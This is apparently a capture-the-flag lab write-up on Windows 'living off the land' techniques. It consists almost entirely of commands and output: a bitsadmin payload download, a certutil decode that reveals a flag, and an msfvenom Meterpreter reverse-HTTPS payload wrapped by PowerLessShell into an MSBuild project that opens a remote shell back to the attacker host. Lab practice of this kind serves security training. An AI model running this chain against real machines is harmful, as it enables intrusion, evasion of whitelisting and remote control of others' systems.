# Room Information

# Room Tasks

## File Operations

### BITSAdmin

```Bash
root@ip-10-10-181-22:~# touch payload.exe
```

```Bash
root@ip-10-10-181-22:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```CMD
DISPLAY: '/Download' TYPE: DOWNLOAD STATE: TRANSFERRED
PRIORITY: FOREGROUND FILES: 1 / 1 BYTES: 0 / 0 (0%)
Transfer complete.

```Bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.168.70 - - [19/Aug/2023 21:08:46] "HEAD /payload.exe HTTP/1.1" 200 -
```

```CMD
C:\Users\thm>bitsadmin.exe /transfer /Download /priority Foreground http://10.10.181.22:8000/payload.exe c:\Users\thm\Desktop\payload.exe
```

```CMD
C:\Users\thm>certutil -decode C:\Users\thm\Desktop\enc_thm_0YmFiOG_file.txt Output.txt
Input Length = 52
Output Length = 38
CertUtil: -decode command completed successfully.
```

```CMD
C:\Users\thm>type Output.txt
THM{ea4e2b9f362320d098635d4bab8a568e}
```

## Other Techniques

```Bash
root@ip-10-10-14-29:~# git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
Cloning into 'PowerLessShell'...
remote: Enumerating objects: 373, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 373 (delta 28), reused 4 (delta 2), pack-reused 323
Receiving objects: 100% (373/373), 113.78 KiB | 1.13 MiB/s, done.
Resolving deltas: 100% (210/210), done.
```

```Bash
root@ip-10-10-14-29:~# msfvenom -p windows/meterpreter/reverse_winhttps LHOST=10.10.14.29 LPORT=1234 -f psh-reflection > liv0ff.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 605 bytes
Final size of psh-reflection file: 3319 bytes
```

```Bash
root@ip-10-10-14-29:~# msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost 10.10.14.29;set lport 1234;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => 10.10.14.29
lport => 1234
[*] Started HTTPS reverse handler on https://10.10.14.29:1234
```

```Bash
root@ip-10-10-14-29:~# cd PowerLessShell/
```

```Bash
root@ip-10-10-14-29:~/PowerLessShell# python2 PowerLessShell.py -type powershell -source ~/liv0ff.ps1 -output liv0ff.csproj
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-powershell.csproj as the template
File 'liv0ff.csproj' created
Process completed
```

```Bash
root@ip-10-10-14-29:~/PowerLessShell# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```CMD
C:\Users\thm>scp root@10.10.14.29:/root/PowerLessShell/liv0ff.csproj .
root@10.10.14.29's password:
liv0ff.csproj                                                  100%   11KB  10.7KB/s   00:00
```

```CMD
C:\Users\thm>c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\liv0ff.csproj
Microsoft (R) Build Engine version 4.8.3761.0
[Microsoft .NET Framework, version 4.0.30319.42000]
Copyright (C) Microsoft Corporation. All rights reserved.

Build started 8/20/2023 12:50:38 AM.
```
```Bash
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/meterpreter/reverse_winhttps
lhost => 10.10.14.29
lport => 1234
[*] Started HTTPS reverse handler on https://10.10.14.29:1234
[*] https://10.10.14.29:1234 handling request from 10.10.138.138; (UUID: olvhctke) Staging x86 payload (176732 bytes) ...
[*] Meterpreter session 1 opened (10.10.14.29:1234 -> 10.10.138.138:49871) at 2023-08-20 01:51:09 +0100

meterpreter > 
```

![]()

![]()


**TASK COMPLETED!**
